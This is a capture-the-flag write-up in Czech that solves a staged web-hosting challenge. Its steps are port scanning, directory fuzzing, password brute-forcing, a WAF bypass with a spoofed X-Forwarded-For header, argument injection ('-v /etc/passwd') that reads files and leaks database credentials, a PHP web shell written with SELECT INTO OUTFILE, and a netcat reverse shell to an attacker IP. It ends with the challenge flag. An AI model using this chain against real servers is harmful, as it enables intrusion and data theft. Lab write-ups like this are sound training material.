# Webhosting (5)

## Zadání

Hi, emergency troubleshooter,

we are preparing to put a new web hosting service into operation. Verify that it is secure and that no secret or classified information can be accessed. The testing instance is running on `wwwhost-new.powergrid.tcc`.

Stay grounded!

## Řešení

Nejdříve uděláme port scan počítače ze zadání.

`nmap wwwhost-new.powergrid.tcc -sV -sC`

```text
PORT     STATE SERVICE VERSION
8000/tcp open  http    Apache httpd 2.4.65 ((Debian))
|_http-server-header: Apache/2.4.65 (Debian)
|_http-title: 403 Forbidden
```

Na počítači běží WEB server, ale stránka se nezobrazí. Na serveru je zřejmě aktivovaný nějaký druh WAF (Web Application Firewall), který kontroluje požadavky a filtruje ty potenciálně nebezpečné. Proto je potřeba změnit `User-Agent`.

`ffuf -u http://wwwhost-new.powergrid.tcc:8000/FUZZ -w /usr/share/dirb/wordlists/common.txt -H "User-Agent: Firefox" -fc 403`

Je nalezen adresář `app`.

Stránka `http://wwwhost-new.powergrid.tcc:8000/app` zobrazí přihlašovací dialog.

`ffuf -u http://wwwhost-new.powergrid.tcc:8000/app/FUZZ -w /usr/share/dirb/wordlists/common.txt -H "User-Agent: Firefox" -fc 403`

```text
                        [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 33ms]
css                     [Status: 301, Size: 347, Words: 20, Lines: 10, Duration: 8ms]
index.php               [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 9ms]
lang                    [Status: 301, Size: 348, Words: 20, Lines: 10, Duration: 8ms]
log                     [Status: 301, Size: 347, Words: 20, Lines: 10, Duration: 8ms]
tools                   [Status: 301, Size: 349, Words: 20, Lines: 10, Duration: 7ms]
uploads                 [Status: 301, Size: 351, Words: 20, Lines: 10, Duration: 8ms]
```

Další adresáře nejsou přístupné, bude potřeba se přihlásit. Pokud se zadá uživatel `admin` nebo `test`, server odpoví `Uživatel nalezen, ale heslo není správné.`. Takže musíme získat heslo pro uživatele `admin` nebo `test`.

`ffuf -u http://wwwhost-new.powergrid.tcc:8000/app/login.php -data "username=admin&password=FUZZ" -w rockyou.txt -H "User-Agent: Firefox" -H "Content-Type: application/x-www-form-urlencoded" -fs 1618`

Nalezeno heslo `Princess25` pro `admin`.

Po přihlášení se zobrazí `Hlavní menu`.

* Admin nástroje
* DB manager
* Zobrazit Log přihlášení
* Zobrazit Log událostí
* Odhlásit se

V Logu událostí jsou zajímavé řádky

* Server: Modsecurity installed
* Server: Modsecurity - IP 203.0.113.10 whitelisted

Na serveru je tedy aktivní WAF [Modsecurity](https://github.com/owasp-modsecurity/ModSecurity), ale je možné ho deaktivovat použitím hlavičky `X-Forwarded-For: 203.0.113.10`.

Stránka `Admin nástroje` umožňuje vypsat zadaný počet řádek z předvyplněného souboru `/var/www/html/app/log/logins.log`, který ale nelze změnit, je možné zadat jen počet řádek.

Ve vhodném doplňku prohlížeče (např. [x-forwarded-for](https://github.com/MisterPhilip/x-forwarded-for)) vyplníme `X-Forwarded-For: 203.0.113.10` pro deaktivaci ModSecurity.

Když odešleme `999999 -v /etc/passwd`, obsah se vypíše.

Řešení této úlohy jsou dvě.

1. Prozkoumáme inicializační soubor dockeru `/entrypoint.sh`

    `999999 -v /entrypoint.sh`

    ```text
    ...
    mkdir -p /secrets
    chown 0755 /secrets
    echo ${WEBHOSTING_FLAG} > /secrets/flag.txt

    unset -v WEB_ADMIN_PASS WEB_TEST_PASS DB_PASS WEBHOSTING_FLAG

    #rm /entrypoint.sh
    ...
    ```

    Flag je tedy v souboru `/secrets/flag.txt`. Odstranění souboru `/entrypoint.sh` je zakomentované, což je asi opomenutí.

    Můžeme si tedy vypsat flag

    `999999 -v /secrets/flag.txt`

1. Hlavní menu obsahuje odkaz na `DB manager`, což je PHP SQL manager [Adminer 5.3.0](https://www.adminer.org). Tato verze nemá žádné známe zranitelnosti, musíme zjistit heslo.

   `999999 -v login.php`

   ```php
   <?php
    require_once 'db.php';

    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        $username = $_POST['username'];
        $password = $_POST['password'];
    ...
    ```

    `999999 -v db.php`

    ```php
    <?php
    require_once 'config.php';

    try {
        $pdo = new PDO("mysql:host=" . DB_HOST . ";dbname=" . DB_NAME, DB_USER, DB_PASS);
        $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
    } catch (PDOException $e) {
        die("DB Connection failed: " . $e->getMessage());
    }
    ```

    `999999 -v config.php`

    ```php
    <?php
    session_start();

    define('DB_HOST', 'localhost');
    define('DB_NAME', 'myapp');
    //define('DB_USER', 'developer');
    define('DB_USER', 'svc_myapp');
    define('DB_PASS', '423e5dc8f0db6b19c85d87d69af31844');
    ```

    Pro přihlášení do Adminera funguje

    `svc_myapp / 423e5dc8f0db6b19c85d87d69af31844`

    i

    `developer / 423e5dc8f0db6b19c85d87d69af31844`.

    Uživatel `svc_myapp` má oprávnění na čtení tabulek a vkládání řádek do tabulky `myapp.login_logs`

    Uživatel `developer` má oprávnění `Server - File`. Toho využijeme pro nahrání PHP souboru, který umožní spouštět příkazy.

    `SELECT '<?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>";?>' INTO OUTFILE '/var/www/html/app/uploads/EngyCZ_x.php'`

    spustíme reverse shell

    `http://wwwhost-new.powergrid.tcc:8000/app/uploads/EngyCZ_x.php?cmd=nc 10.200.0.91 4444 -e /bin/sh`

    a snadno najdeme FLAG

    `find / | grep flag`

## Flag

`FLAG{BCba-VkYk-Kw3N-HFPw}`
